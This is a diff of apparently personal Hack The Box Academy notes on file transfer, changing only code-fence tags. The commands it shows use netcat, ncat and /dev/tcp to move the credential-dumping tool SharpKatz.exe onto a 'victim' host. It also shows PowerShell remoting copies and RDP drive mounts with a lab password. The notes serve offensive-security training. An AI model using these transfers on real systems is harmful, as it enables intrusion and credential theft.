@@ -85,43 +85,41 @@ Recieve
 victim@target:~$ nc -l -p 8000 > SharpKatz.exe
 ```
 
-```shell-session
+```shell
 victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
 ```
 
-```shell-session
-
+```shell
 victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
-
 ```
 
-```shell-session
+```shell
 victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
 ```
 
 Send
-```shell-session
+```shell
 jabrach@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
 ```
 
-```shell-session
+```shell
 jabrach@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
 ```
 
-```shell-session
+```shell
 sudo nc -l -p 443 -q 0 < SharpKatz.exe
 ```
 
-```shell-session
+```shell
 jabrach@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
 ```
 
-```shell-session
+```shell
 jabrach@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
 ```
 
 #### PowerShell Session File Transfer
-```powershell-session
+```powershell
 PS C:\htb> whoami
 
 htb\administrator
@@ -131,29 +129,29 @@ PS C:\htb> hostname
 DC01
 ```
 
-```powershell-session
+```powershell
 Test-NetConnection -ComputerName DATABASE01 -Port 5985
 ```
 
-```powershell-session
+```powershell
 PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
 ```
 
-```powershell-session
+```powershell
 PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
 ```
 
-```powershell-session
+```powershell
 PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
 ```
 
 #### RDP
 
-```shell-session
+```shell
 jabrach@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
 ```
 
-```shell-session
+```shell
 jabrach@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
 ```
 
